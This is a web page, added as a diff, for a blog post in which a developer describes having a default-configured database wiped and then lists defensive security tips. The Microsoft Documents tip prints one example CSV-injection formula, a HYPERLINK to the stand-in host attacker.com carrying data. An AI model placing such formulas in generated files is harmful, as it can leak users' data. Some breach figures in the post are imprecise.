@@ -1,0 +1,725 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="author" content="Adrian Mejia">
+    <link rel="author" href="humans.txt" />
+    <meta name="description" content="JavaScript tutorials and web development articles including topics like NodeJS, Angular, VueJS, Data Structures and Algorithms.">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+
+    <link rel="alternative" href="/atom.xml" title="Adrian Mejia Blog" type="application/atom+xml">
+
+    
+    <title>45 Security Tips to Avoid Hacking | Adrian Mejia Blog</title>
+
+    <!-- Favicons -->
+    <link rel="apple-touch-icon-precomposed" sizes="57x57" href="/apple-touch-icon-57x57.png" />
+    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="/apple-touch-icon-114x114.png" />
+    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="/apple-touch-icon-72x72.png" />
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144x144.png" />
+    <link rel="apple-touch-icon-precomposed" sizes="60x60" href="/apple-touch-icon-60x60.png" />
+    <link rel="apple-touch-icon-precomposed" sizes="120x120" href="/apple-touch-icon-120x120.png" />
+    <link rel="apple-touch-icon-precomposed" sizes="76x76" href="/apple-touch-icon-76x76.png" />
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="/apple-touch-icon-152x152.png" />
+    <link rel="icon" type="image/png" href="/favicon-196x196.png" sizes="196x196" />
+    <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96" />
+    <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32" />
+    <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16" />
+    <link rel="icon" type="image/png" href="/favicon-128.png" sizes="128x128" />
+    <meta name="application-name" content="Adrian Mejia's Blog"/>
+    <meta name="msapplication-TileColor" content="#FFFFFF" />
+    <meta name="msapplication-TileImage" content="/mstile-144x144.png" />
+    <meta name="msapplication-square70x70logo" content="/mstile-70x70.png" />
+    <meta name="msapplication-square150x150logo" content="/mstile-150x150.png" />
+    <meta name="msapplication-wide310x150logo" content="/mstile-310x150.png" />
+    <meta name="msapplication-square310x310logo" content="/mstile-310x310.png" />
+    <meta name="msapplication-notification" content="frequency=30;polling-uri=http://notifications.buildmypinnedsite.com/?feed=https://adrianmejia.com/atom.xml" />
+
+    <link rel="canonical" href="https://adrianmejia.com/i-got-hacked-and-it-changed-my-life-on-security-tips/" />
+    <!-- Open Graph -->
+    <meta property="og:url" content="https://adrianmejia.com/I-got-hacked-and-It-changed-my-life-on-security-tips/" />
+    <meta property="og:site_name" content="Adrian Mejia Blog" />
+    <meta property="og:type" content="article" />
+    <meta property="og:description" content="JavaScript tutorials and web development articles including topics like NodeJS, Angular, VueJS, Data Structures and Algorithms." />
+    <meta property="og:image" content="https://adrianmejia.com/images/i-got-hacked-change-life-security-tips-large.jpg" />
+    <meta property="og:title" content="45 Security Tips to Avoid Hacking" />
+    <meta property="fb:app_id" content="761831487293468" />
+    <meta property="fb:admins" content="895685163"/>
+    <!-- /Open Graph -->
+
+    <script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-24183929-4', 'auto');
+ga('send', 'pageview');
+</script><script async defer src='https://www.google-analytics.com/analytics.js'></script>
+
+
+    <!-- Critical Styles -->
+    <style media="screen">
+      .overlay { display: none }
+    </style>
+    
+<link rel="stylesheet" href="/stylesheets/main.css">
+
+    <!-- loadDeferredStyles -->
+    <noscript id="deferred-styles">
+      
+<link rel="stylesheet" href="/stylesheets/font-awesome.min.css">
+    </noscript>
+
+    <script>
+      var loadDeferredStyles = function() {
+        var addStylesNode = document.getElementById("deferred-styles");
+        var replacement = document.createElement("div");
+        replacement.innerHTML = addStylesNode.textContent;
+        document.body.appendChild(replacement)
+        addStylesNode.parentElement.removeChild(addStylesNode);
+      };
+      var raf = requestAnimationFrame || mozRequestAnimationFrame ||
+          webkitRequestAnimationFrame || msRequestAnimationFrame;
+      if (raf) raf(function() { window.setTimeout(loadDeferredStyles, 0); });
+      else window.addEventListener('load', loadDeferredStyles);
+    </script>
+
+  <meta name="generator" content="Hexo 5.0.2"></head>
+  <body>
+    <header class="titlebar mdl-shadow--2dp">
+      <div class="container align-center flexbox--space-between">
+        <!-- <div class="row"> -->
+          <!-- <div class="col-md-12"> -->
+            <span class="hidden-mobile-up">
+              <i class="fa fa-bars" aria-hidden="true"></i>
+            </span>
+
+            <a href="/" class="align-center m-y-2">
+              <img src="/images/adrianmejia-logo.png" alt="Adrian Mejia Logo" class="animation--bounce-in"/>
+              <h1 class="hidden-mobile-down hidden">
+                Adrian Mejia
+              </h1>
+            </a>
+
+            <nav class="hidden-mobile-down navbar">
+              
+                <a href="/#home" class="animation--radial-out" id="Home" onclick="track('/#home', 'menu', true)">Home</a>
+              
+                <a href="/#trending-posts" class="animation--radial-out" id="Trending" onclick="track('/#trending-posts', 'menu', true)">Trending</a>
+              
+                <a href="/#popular-posts" class="animation--radial-out" id="Popular" onclick="track('/#popular-posts', 'menu', true)">Popular</a>
+              
+                <a href="/#about" class="animation--radial-out" id="About" onclick="track('/#about', 'menu', true)">About</a>
+              
+                <a href="/blog/" class="animation--radial-out" id="Blog" onclick="track('/blog/', 'menu', true)">Blog</a>
+              
+            </nav>
+
+            <a href="#" id="search-modal" onclick="track('#search', 'search', true)" class="open-overlay">
+  <i class="fa fa-search" aria-hidden="true"></i>
+</a>
+
+<div id="search-overlay" class="overlay" aria-hidden="true">
+
+  <script id="movie" type="text/x-handlebars-template">
+    <article class="movie">
+      {{#photos.0}}
+      <a href="/{{path}}">
+        <img class="movie-image" src="{{photos.0}}" />
+      </a>
+      {{/photos.0}}
+
+      <div class="movie-meta">
+        <div class="movie-title">
+          <a href="/{{path}}">
+            {{{_highlightResult.title.value}}}
+          </a>
+          <span class="movie-year">
+            {{updatedYear}}
+          </span>
+        </div>
+
+        <div class="movie-rating">
+          {{#stars}}
+            <span class="ais-star-rating--star{{^.}}__empty{{/.}}">
+            </span>
+          {{/stars}}
+        </div>
+
+        <p>
+          {{{_highlightResult.excerptStrip.value}}}
+        </p>
+
+        <div class="movie-genres">
+          {{#tags}}
+            <div class="movie-genre">
+              {{.}}
+            </div>
+          {{/tags}}
+        </div>
+      </div>
+    </article>
+  </script>
+
+  <div class="search-container">
+
+    <div class="top">
+      <div class="search-button">
+        <i class="fa fa-search"></i>
+      </div>
+      <div class="input-container">
+        <input type="text" id="search-box" />
+        <div id="stats"></div>
+      </div>
+      <a href="#" class="close-overlay">
+        <i class="fa fa-times"></i>
+      </a>
+    </div>
+
+    <div class="content">
+      <div class="facets">
+
+        <div class="facet">
+          <div id="clear-all" class="facet-title"></div>
+        </div>
+
+        <div class="facet">
+          <div class="facet-title">
+            <i class="fa fa-tags" aria-hidden="true"></i> Tags
+          </div>
+          <div id="tags"></div>
+        </div>
+
+        <div class="facet">
+          <div class="facet-title">
+            <i class="fa fa-folder-o" aria-hidden="true"></i>
+            Categories
+          </div>
+          <div id="categories"></div>
+        </div>
+
+        <div class="facet">
+          <div class="facet-title">
+            <i class="fa fa-eye" aria-hidden="true"></i>
+            Views
+          </div>
+          <div id="ratings"></div>
+        </div>
+
+        <div class="facet">
+          <div class="facet-title">
+            <i class="fa fa-calendar" aria-hidden="true"></i>
+            Year
+          </div>
+          <div id="year"></div>
+        </div>
+      </div>
+
+      <div class="canvas">
+        <div id="hits"></div>
+
+        <div id="pagination"></div>
+
+        <div>Powered by <img src="/images/Algolia_logo_bg-white.svg" height="30" alt="Algolia search"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<script src="/js/search.babel.js"></script>
+
+
+      </div>
+    </header>
+    <nav class="hidden-mobile-up mdl-shadow--2dp">
+      <div class="container flexbox--space-between navbar">
+        
+          <a href="/#home" class="animation--underline-from-center">Home</a>
+        
+          <a href="/#trending-posts" class="animation--underline-from-center">Trending</a>
+        
+          <a href="/#popular-posts" class="animation--underline-from-center">Popular</a>
+        
+          <a href="/#about" class="animation--underline-from-center">About</a>
+        
+          <a href="/blog/" class="animation--underline-from-center">Blog</a>
+        
+      </div>
+    </nav>
+
+    <main>
+      <!--https://developers.google.com/search/docs/data-types/articles-->
+<!--http://schema.org/BlogPosting-->
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BlogPosting",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": ""
+  },
+  "headline": "45 Security Tips to Avoid Hacking",
+  
+  "image": {
+    "@type": "ImageObject",
+    "url": "https://adrianmejia.com/images/i-got-hacked-change-life-security-tips-large.jpg",
+    "height": 360,
+    "width": 728
+  },
+  
+  "datePublished": "2019-01-24T16:08:53-05:00",
+  "dateModified": "2019-01-24T16:08:53-05:00",
+  "author": {
+    "@type": "Person",
+    "name": "Adrian Mejia"
+  },
+   "publisher": {
+    "@type": "Organization",
+    "name": "Adrian Mejia",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://adrianmejia.com/images/logo.png",
+      "width": 347,
+      "height": 50
+    }
+  },
+  "description": ""
+}
+</script>
+
+
+<article class="container post">
+
+  <section class="hero">
+    <div class="muted">
+      <a class="category-link" href="/categories/learnings/">Learnings</a>
+    </div>
+
+    <h1>45 Security Tips to Avoid Hacking</h1>
+
+    <div class="muted">
+      <span title="Last time this post was updated">
+        <i class="fa fa-calendar" aria-hidden="true"></i>
+        Last updated
+        <time datetime="2019-01-24T21:08:53.000Z" itemprop="dateUpdated">January 24th 2019</time>
+      </span>
+
+      
+        <span class="m-x-2" title="Pageviews">
+          <i class="fa fa-eye" aria-hidden="true"></i>
+          1.2k
+        </span>
+      
+
+      <span class="m-x-2" title="Click to go to the comments section">
+        <a href="#disqus_thread">
+          <i class="fa fa-comment-o" aria-hidden="true"></i>
+          <span class="disqus-comment-count" data-disqus-url="https://adrianmejia.com/I-got-hacked-and-It-changed-my-life-on-security-tips/">0</span>
+        </a>
+      </span>
+
+      
+        <span>
+          <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/security/" rel="tag">security</a><span class="tag-list-count">1</span></li></ul>
+        </span>
+      
+    </div>
+  </section>
+
+  <div class="art-container" style="background-color: #A6282E">
+    
+      <picture>
+        <source media="(min-width: 728px)" srcset="/images/i-got-hacked-change-life-security-tips-large.jpg">
+        <source srcset="/images/i-got-hacked-change-life-security-tips-small.jpg">
+        <img src="/images/i-got-hacked-change-life-security-tips-large.jpg" alt="45 Security Tips to Avoid Hacking">
+      </picture>
+    
+  </div>
+
+  <div class="row">
+    <section class="col-sm-8 p-x-2">
+
+      <div class="post-content  toc-content ">
+        <p>I got hacked, and it changed my life’s <strong>perspective</strong> <strong>on security</strong>. Here’s a compilation of something that happened to me and some security tips to minimize this kind of surprises.</p>
+<!-- <details>
+  <summary>Hack incident details... (click to expand)</summary> -->
+
+<h1 id="Hack-incident"><a href="#Hack-incident" class="headerlink" title="Hack incident"></a>Hack incident</h1><p>I’ve been very chill about security most of my life. I’m 32, and I never got my social media hacked or emails. However, something that changed when I set up a personal server on the cloud and I got an intruder!</p>
+<p>This server was collecting data from financial markets (just for fun and to play with some backtracking strategies). One day, I check the database as usual, and It was empty! I was in shock! What happened!? 👀</p>
+<p>I reviewed the authentication logs and found out thousands of attempts to log in to my server! 🤯 I saw efforts from everywhere: France, Rusia, Canada, Germany, China, and other countries! Fortunately, none of this got in. However, I still got hacked. How? 🤔</p>
+<p>It turns out that when I set up the database, I didn’t bother to change the default configuration. It wouldn’t do that for work but since it was a personal project and the data was public anyway, so I didn’t care too much. I also thought “Meh, nobody is going to find it. I don’t have this IP published anywhere”. However, I was wrong. People/bots did find it and tons of them!</p>
+<p>So I learned the following. There are people/organizations which scan every possible IP address. It doesn’t matter if it is listed anywhere or not. Hackers/bots will scan any known port on every IP address and hope people leave defaults open.</p>
+<p>Hackers will try to log in into your server and try very common usernames (<code>pi</code>, <code>linode</code>, <code>root</code>, <code>admin</code>, etc.) and default passwords. They also attempt to connect to any possible database on their default ports. I was able to see all the attempts from the logs!</p>
+<p>I’m glad they drop my database, so I noticed what happened. Hackers could keep login to my server for years, and I probably wouldn’t see for a long time. Many companies have their servers compromised, and they don’t even know it. When they realized it, it’s already late, and then you see the news about it.</p>
+<p>Some examples of data breaches:</p>
+<ul>
+<li>In 2013, <strong>Yahoo</strong> 3 billion users and <strong>Target</strong> with 110 credit cards.</li>
+<li>In 2014, <strong>Marriott</strong> with 500 million guests and <strong>eBay</strong> with 145 million users.</li>
+<li>In 2017, <strong>Equifax</strong> with 143 million social security numbers, addresses, and birth dates.</li>
+<li>Even banks get hacked like the JP Morgan <strong>Chase</strong> on 2014 with 76 million households and 7 million businesses.</li>
+<li>Not even security companies are exempt like <strong>RSA Security</strong> in 2011 with 40 million employee records stolen.</li>
+</ul>
+<!-- </details> -->
+
+<h1 id="Security-Tips"><a href="#Security-Tips" class="headerlink" title="Security Tips"></a>Security Tips</h1><p>Cybercriminals are real, and everything that you have connected to the Internet is their target. No company or person can 100% prevent getting hacked. However, you can make it way more difficult and reduce the chances to 1 in 1000 years, which is pretty good.</p>
+<p>For instance, your password length and unique character alone can tell how long it would take to break it:</p>
+<ul>
+<li>If your password is <code>Password</code> takes around 0.29 seconds to break.</li>
+<li>If your password is <code>P@ssw0rd</code> takes around 14 years.</li>
+<li>If your password has 12 characters <code>abcdefghijkl</code> it takes 200 years to generate it.</li>
+<li>This password <code>P@ssw0rd123456!!</code> would take more than hundreds of thousand years to decipher.</li>
+</ul>
+<p>Here are my security tips on how to minimize hacking. It goes from generic usable for mostly everyone to server setup recommendations.</p>
+<h2 id="Generic-tips"><a href="#Generic-tips" class="headerlink" title="Generic tips"></a>Generic tips</h2><ul>
+<li>Use different passwords for everything. If you use the same password for everything some website gets compromised (e.g., Amazon), then everything that has the same user and password will be at risk. I know it’s a hassle to remember all, but you don’t have to. Use a password manager like Bitwarden, 1Password, LastPass, Dashlane or even Google Chrome built-in password manager.</li>
+<li>Use long passwords with special characters. If you are using a password manager, you can ask to auto-generate a secure password.</li>
+<li>Use ** 2-factor authentication** whenever is available.</li>
+<li>Enable all security features on the services that you use.</li>
+<li>Everything that runs arbitrary code on your computer should not be trusted.</li>
+<li>Don’t trust defaults blindly verify if there’s a more secure option.</li>
+<li>Keep all your devices, operating systems and dependencies up-to-date. Most well-known vulnerabilities are fixed shortly after they are reported.</li>
+</ul>
+<h2 id="Email-security-tips"><a href="#Email-security-tips" class="headerlink" title="Email security tips"></a>Email security tips</h2><ul>
+<li>Have ** 2-factor authentication** on your emails. If someone gets access to your primary email, then they can use <code>forgot password</code> on many sites (Evernote, Bank Accounts) and change the password. I heard of somebody that got their email compromised; in turn, the hacker got access to their Evernote and found some passwords to their cryptocurrency exchanges and got robbed big time. Don’t be that guy. Enable 2FA.</li>
+<li>Be aware of phishing emails. No, Bill Gates won’t share his fortune and donate you a million, nor you won any lottery. Don’t trust any email saying that you won money or any price. Also, be aware of fake company emails asking for you to log in somewhere. The site might look very similar, but it’s a trap! They want to capture your password. Check the domain carefully or even better yet don’t click on any link from the email and type your company web address directly as you usually do.</li>
+<li>Be aware of malicious attachments. Specially executables (*.exe, *.bat, *.sh, *.zip). See also Microsoft documents part. Everything that can run arbitrary code on your computer should not be trusted.</li>
+</ul>
+<h2 id="Social-Media"><a href="#Social-Media" class="headerlink" title="Social Media"></a>Social Media</h2><ul>
+<li>Enable all the security options they have like 2 Factor authentication, SMS confirmation.</li>
+<li>Don’t share passwords with your friends or change them afterwards.</li>
+</ul>
+<h2 id="Microsoft-Documents"><a href="#Microsoft-Documents" class="headerlink" title="Microsoft Documents"></a>Microsoft Documents</h2><ul>
+<li>If you use your documents locally or by trusted peers, you shouldn’t have many problems. However, for auto-generated documents like (*.csv) that you download from emails or compromised websites they can change data or insert malicious links (<code>=HYPERLINK(&quot;[http://attacker.com?some=&#39;data](http://attacker.com/?some=%27data%27)&#39;)</code>) and take you to their websites.</li>
+<li>Be aware of macros. They are code that automatically runs when you open the program. In modern versions, Office alerts you when a doc has a macro, and now they are disabled by default.</li>
+</ul>
+<h2 id="Wifi-security-tips"><a href="#Wifi-security-tips" class="headerlink" title="Wifi security tips"></a>Wifi security tips</h2><ul>
+<li>Use a password for your wifi. If you leave it open anybody connects to it can have access to your computers, cell phones, tablets, and smart fridge or cameras.</li>
+<li>Use strong encryption for Wifi. Don’t use WEP encryption. Use  WPA or the newer WPA2. WEP can be cracked relatively quickly using some programs.</li>
+<li>Use a strong password. It makes it harder to break.</li>
+<li>Provide a separate network for guests, so your connected devices are not exposed nor your router.</li>
+<li>If you use public wifi, consider using a VPN. Hotspot operators and ISPs can snoop into your traffic, but if you use a VPN, they won’t be able to.</li>
+<li>If you are very paranoid or are working with something top secret. Here are some advanced options:<ul>
+<li>Have a hidden Wi-fi (SSID) and don’t broadcast it. You will need the name to connect to it.</li>
+<li>Restrict access by MAC address list. This list will allow only the devices in there to connect to the network.</li>
+<li>Shutdown your network when is not in used. It’s a little extreme, but that’s the ultimate security measure or use wired connections.</li>
+</ul>
+</li>
+</ul>
+<h2 id="Developers-security-tips"><a href="#Developers-security-tips" class="headerlink" title="Developers security tips"></a>Developers security tips</h2><ul>
+<li>Keep all your operating systems and dependencies up-to-date. Maintainers usually patch their software after vulnerabilities come to light.</li>
+<li>Use latest encryption protocols TLS (rather than older SSL versions)<ul>
+<li>Use SFTP instead of FTP</li>
+<li>Use SSH instead of telnet</li>
+<li>Use HTTPS instead of HTTP. You can encrypt for free with <a target="_blank" rel="noopener" href="https://letsencrypt.org/">Let’s Encrypt</a>.</li>
+</ul>
+</li>
+<li>Disable direct root login in SSH. You can escalate if needed using <code>sudo</code>.</li>
+<li>Disable SSH connection with passwords. Use ssh private key to log in instead.</li>
+<li>Use firewalls to block any port that you are not using. Firewalls minimize the surface of attack. For Linux, you can use <code>UFW</code>; another option is <code>iptables</code>.</li>
+<li>Use VPN and private networks. If you don’t need to expose a database to the internet, even better. Make it only accessible for your private network or VPN.</li>
+<li>Don’t trust the default configuration of programs facing the internet. Change default ports on databases, ssh.<ul>
+<li>Instead of logging <code>ssh</code> on port <code>22</code>. Use port <code>2146</code> for instance. I did this and noticed how the attempts of login went from hundreds to zero.</li>
+<li>Instead of running MongoDB on port <code>27017</code>, use <code>56073</code></li>
+</ul>
+</li>
+<li>Change default user/passwords. Remove default users (e.g., RaspberryPi comes with the <code>pi</code> user that allow people to login into it, change it!)</li>
+<li>Enable authorization on your databases (use passwords). Don’t leave them wide open to the world (and hackers).</li>
+<li>Remove default accounts in your databases. E.g., MySQL</li>
+<li>Keep backups (nightly?)</li>
+<li>Automate monitoring and alert reports. Nobody has time to be glued to logs every time. However, you should set alerts when certain events happen.<ul>
+<li>Alerts for failed attempts of login<ul>
+<li><code>zcat /var/log/auth.log.*.gz | grep &#39;sshd&#39; | grep &#39;exceeded\|Invalid&#39; | cut -d: -f4- | sort | uniq -c | sort -rn</code></li>
+</ul>
+</li>
+<li>Monitor your database logs for anomalies, such as dropping database commands.</li>
+</ul>
+</li>
+<li>Be aware of package managers. To name a few Node’s NPM, Ruby Gems and Mac’s <a target="_blank" rel="noopener" href="http://brew.sh/">brew.sh</a>. If someone gets access to the administrator password of popular packages you might be at risk.<ul>
+<li>NPM has scripts that can run arbitrary code when you install packages. Take a look at <a target="_blank" rel="noopener" href="https://docs.npmjs.com/misc/scripts#examples">postinstall</a>. Similarly,  Ruby Gems has a <code>post_install</code> hook. This script has access to your whole file system, ssh keys and nothing prevent them from sending them to a remote server. Just be aware.</li>
+<li>Brew.sh adds binaries on your <code>/usr/local</code> and modifies the <code>PATH</code>, so this location has the preference. That change could make malicious programs run before the original program.</li>
+</ul>
+</li>
+<li>Finally, never trust anything that comes from the user/internet.  If you are running a web form, sanitize the inputs (strip out malicious scripts).</li>
+</ul>
+<p>Be safe!</p>
+
+      </div>
+
+      <!-- after post -->
+      <div class="hidden-mobile-down">
+        <h3>Now, your turn!</h3>
+        Thanks for reading this far. Here are some things you can do next:
+
+        <ul>
+          <li>Found a typo?
+            <a target="_blank" rel="noopener" href="https://github.com/amejiarosario/amejiarosario.github.io/edit/source/source/_posts/2019-01-24-I-got-hacked-and-It-changed-my-life-on-security-tips.md">
+              Edit this post</a>.
+          </li>
+          <li>Got questions?
+            <a href="#comments-section">comment</a>
+            below.
+          </li>
+          <li>
+            Was it useful? Show your
+            <a href="/support">
+              support</a> or share it.
+            <!-- <a target="_blank" href="http://paypal.me/amejiarosario">Paypal</a>, -->
+            <!-- <a target="_blank" href="https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=HZLFWQAFENN7W&source=url">Paypal</a>,
+            <a target="_blank" href="https://bitaps.com/3A8xanut3wddz1jJ7JWSw8nwwpUahLJpZi">Bitcoin</a>,
+            <a target="_blank" href="https://www.patreon.com/amejiarosario">Patreon</a>. -->
+          </li>
+        </ul>
+      </div>
+
+      <div class="hidden-mobile-up">
+        <a target="_blank" rel="noopener" href="https://books.adrianmejia.com">
+          <!-- <img src="/images/data-structure-algorithms-javascript-presell.jpg" alt="Data Structure and Algorithms in JavaScript eBook"> -->
+          <img src="/images/data-structure-algorithms-banner.jpg" alt="Data Structure and Algorithms in JavaScript eBook">
+        </a>
+      </div>
+
+      <!-- Next and previous posts -->
+      
+        <div class="article-nav m-y-4">
+          
+            <a href="/How-to-perform-Atomic-Operations-on-MongoDB/" class="article-nav-newer" class="article-nav-link-wrap">
+              <strong class="article-nav-caption"><i class="fa fa-chevron-left"></i> newer</strong>
+              <div class="article-nav-title">
+                
+                  How to perform Atomic Operations on MongoDB?
+                
+              </div>
+            </a>
+          
+          
+            <a href="/How-can-developers-reduce-stress/" class="article-nav-older" class="article-nav-link-wrap">
+              <strong class="article-nav-caption">older <i class="fa fa-chevron-right"></i></strong>
+              <div class="article-nav-title">How can developers reduce stress</div>
+            </a>
+          
+        </div>
+      
+
+      
+
+        <!-- Related -->
+        <footer>
+          <!-- subscribe -->
+          <div class="m-y-4">
+            <!-- Begin MailChimp Signup Form -->
+<link href="//cdn-images.mailchimp.com/embedcode/horizontal-slim-10_7.css" rel="stylesheet" type="text/css">
+<style type="text/css">
+	#mc_embed_signup{background:#fff; clear:left; font:14px Helvetica,Arial,sans-serif; width:100%;}
+	/* Add your own MailChimp form style overrides in your site stylesheet or in this style block.
+	   We recommend moving this block and the preceding CSS link to the HEAD of your HTML file. */
+</style>
+<div id="mc_embed_signup">
+<form action="//adrianmejia.us2.list-manage.com/subscribe/post?u=2294bb28c5931a6f2338d2474&amp;id=52678e825b" method="post" id="mc-embedded-subscribe-form" name="mc-embedded-subscribe-form" class="validate" novalidate>
+    <div id="mc_embed_signup_scroll">
+	<label for="mce-EMAIL">Subscribe &amp; stay up to date!</label>
+	<input type="email" value="" name="EMAIL" class="email" id="mce-EMAIL" placeholder="email address" required>
+    <!-- real people should not fill this in and expect good things - do not remove this or risk form bot signups-->
+    <div style="position: absolute; left: -5000px;" aria-hidden="true"><input type="text" name="b_2294bb28c5931a6f2338d2474_52678e825b" tabindex="-1" value=""></div>
+    <div class="clear">&nbsp;<input type="submit" value="Subscribe" name="subscribe" id="mc-embedded-subscribe" class="button"></div>
+    </div>
+</form>
+</div>
+<!--End mc_embed_signup-->
+
+<script type="text/javascript">
+  var form = document.getElementById('mc-embedded-subscribe-form');
+  form.addEventListener('submit', function(event) {
+    event.preventDefault();
+    ga('send', 'event', 'newsletter', 'signup', 'page', {
+      hitCallback: createFunctionWithTimeout(function() {
+        form.submit();
+      })
+    });
+  });
+</script>
+
+          </div>
+
+          <!-- Author Bio -->
+          <b>About the author</b>
+          
+              <!-- Adrian Mejia Bio -->
+            
+<section class="bio-box">
+  <img class="m-a-1 not-scaled" src="/images/adrian-mejia-headshot.png" alt="Adrian Mejia">
+  <article class="p-x-1" style="display: flex; flex-direction:column;">
+    <p class="muted">Adrian Mejia is a full-stack web developer located in Boston.
+      Currently working at Cisco as a Software Engineer.
+      Adrian enjoys writing posts about JavaScript, Node.js, WebDev, Algorithms, Startups.
+      Also, he likes to travel ✈️ and biking 🚴‍.
+      <!-- Find out more <a href="/#about">here</a>. -->
+    </p>
+    <!-- <p class="m-y-0"><a target="_blank" rel="noopener" href="https://twitter.com/iAmAdrianMejia">Follow him on Twitter</a>.</p> -->
+    <a target="_blank" rel="noopener" href="https://twitter.com/iAmAdrianMejia" id="twitter-follow-button" class="twitter-follow-button" data-show-count="false">Follow @iAmAdrianMejia</a>&nbsp;
+  </article>
+</section>
+
+          
+
+          <div class="m-y-4">
+            
+          </div>
+
+          <!-- 726x88 -->
+          <!---->
+          <!--<script data-cfasync="false" type="text/javascript" src="(DISABLED)//www.eboundservices.com/ads/728x90_non_responsive.js"></script>-->
+<!--           <div class="hidden-mobile-down">
+            <script data-cfasync="false" type="text/javascript" src="(DISABLED)//www.eboundservices.com/ads/728x90_responsive.js"></script>
+          </div> -->
+          <!--<script data-cfasync="false" type="text/javascript" src="//www.eboundservices.com/ads/336x280_responsive.js"></script>-->
+
+
+          <!-- last working ads -->
+          <!-- <script data-cfasync="false" type="text/javascript" src="//www.eboundservices.com/ads/dfp/336x280_responsive.js"></script> -->
+
+
+        </footer>
+
+      <!-- if(page.layout !== 'snippet') -->
+    </section>
+
+    <!-- Asides (Ads, TOC, ...) -->
+    <aside class="col-sm-4 p-x-2 col-xs-order-1">
+      <section>
+
+        <!-- 300x250 -->
+        <!---->
+        <!--<script data-cfasync="false" type="text/javascript" src="//www.eboundservices.com/ads/300x250_non_responsive.js"></script>-->
+        <!--<div class="hidden-mobile-down">-->
+          <!--<script data-cfasync="false" type="text/javascript" src="//www.eboundservices.com/ads/300x250_responsive.js"></script>-->
+        <!--</div>-->
+
+        <!--<div class="hidden-mobile-up">-->
+        <!--<script data-cfasync="false" type="text/javascript" src="//www.eboundservices.com/ads/336x280_responsive.js"></script>-->
+        <!--</div>-->
+
+        <!-- last working ads -->
+        <!-- <script data-cfasync="false" type="text/javascript" src="//www.eboundservices.com/ads/dfp/336x280_responsive.js"></script> -->
+
+      </section>
+
+      <section class="sticky-element--start">
+        <div class="muted">
+          <div class="p-y-1">
+            <a href="#" class=""><span id="back-to-top" title="Go back to the top of this page">
+              <i class="fa fa-arrow-up"></i> Top
+            </span></a>
+
+            <a href="#" class="p-x-3" title="Improve this post" onclick="track('https://github.com/amejiarosario/amejiarosario.github.io/edit/source/source/_posts/2019-01-24-I-got-hacked-and-It-changed-my-life-on-security-tips.md')">
+              <i class="fa fa-pencil"></i> Edit this post
+            </a>
+            <!-- <a href="#" title="Share this post"><i class="fa fa-share"></i> Share</a> -->
+            <!--<div class="p-y-1">-->
+              <!---->
+              <!---->
+              <!---->
+              <!---->
+            <!--</div>-->
+          </div>
+
+          
+            <h3 class="toc-title">Contents</h3>
+            <div>
+              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hack-incident"><span class="toc-number">1.</span> <span class="toc-text">Hack incident</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Security-Tips"><span class="toc-number">2.</span> <span class="toc-text">Security Tips</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Generic-tips"><span class="toc-number">2.1.</span> <span class="toc-text">Generic tips</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Email-security-tips"><span class="toc-number">2.2.</span> <span class="toc-text">Email security tips</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Social-Media"><span class="toc-number">2.3.</span> <span class="toc-text">Social Media</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Microsoft-Documents"><span class="toc-number">2.4.</span> <span class="toc-text">Microsoft Documents</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wifi-security-tips"><span class="toc-number">2.5.</span> <span class="toc-text">Wifi security tips</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Developers-security-tips"><span class="toc-number">2.6.</span> <span class="toc-text">Developers security tips</span></a></li></ol></li></ol>
+            </div>
+
+            <!-- 300x600 -->
+            <!---->
+            <!--<script data-cfasync="false" type="text/javascript" src="(DISABLED)//www.eboundservices.com/ads/300x600_non_responsive.js"></script>-->
+            <div class="hidden-mobile-down">
+              <!-- last working ads -->
+              <!-- <script data-cfasync="false" type="text/javascript" src="//www.eboundservices.com/ads/dfp/160x600_responsive.js"></script> -->
+
+              <a href="https://books.adrianmejia.com" target="_blank">
+                <!-- <img src="/images/data-structure-algorithms-javascript-presell.jpg" alt="Data Structure and Algorithms in JavaScript eBook"> -->
+                <img src="/images/data-structure-algorithms-banner.jpg" alt="Data Structure and Algorithms in JavaScript eBook">
+              </a>
+            </div>
+          
+        </div>
+      </section>
+    </aside>
+  </div>
+
+  <!-- comments -->
+  <a id="comments-section"></a>
+  <footer class="row sticky-element--end">
+    <div class="col-xs-12">
+      <section>
+  <div id="disqus_thread"></div>
+  <script>
+    var disqus_config = function () {
+      this.page.url = 'https://adrianmejia.com/I-got-hacked-and-It-changed-my-life-on-security-tips/';
+      this.page.identifier = 'https://adrianmejia.com/I-got-hacked-and-It-changed-my-life-on-security-tips/';
+    };
+    (function() {
+      var d = document, s = d.createElement('script');
+      s.src = '//adrianmejia.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a target="_blank" href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments powered by Disqus.</a></noscript>
+</section>
+
+    </div>
+  </footer>
+</article>
+
+    </main>
+
+    <!-- uxa -->
